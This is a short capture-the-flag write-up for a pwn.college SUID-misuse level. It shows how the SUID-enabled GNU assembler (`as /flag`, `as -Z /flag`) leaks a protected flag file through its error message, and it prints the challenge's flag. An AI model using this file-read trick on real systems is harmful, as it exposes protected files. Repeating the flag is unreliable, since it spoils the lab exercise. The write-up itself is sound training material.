`as` is the GNU assembler, responsible for translating assembly code into machine code object files that can later be linked to form executable or libraries.

When compiling a `c` or `c++` program, GCC invokes `as` internally to assemble the generated assembly code before linking it with other object files and libraries to create the final executable.

I searched for `file`  using `as --help | grep  file` and found this 

`-Z : generate object file even after errors the source file`

After running `as -Z /flag` it shows the content of the `flag` file. `as /flag` also works.


```bash
hacker@program-misuse-level-49:~$ /challenge/babysuid_level49 
Welcome to /challenge/babysuid_level49!

This challenge is part of a series of programs that
just straight up were not designed to let you read files.

I just set the SUID bit on /usr/bin/as.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level49) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/as!
hacker@program-misuse-level-49:~$ as -Z /flag
/flag: Assembler messages:
/flag:1: Error: no such instruction: `pwn.college{Uu1B1JE1Ve-aFYG7noevDBSa94f.0VM5EDL0AjNzQzW}'
1 error, 0 warnings, generating bad object file
hacker@program-misuse-level-49:~$ as /flag
/flag: Assembler messages:
/flag:1: Error: no such instruction: `pwn.college{Uu1B1JE1Ve-aFYG7noevDBSa94f.0VM5EDL0AjNzQzW}'
```



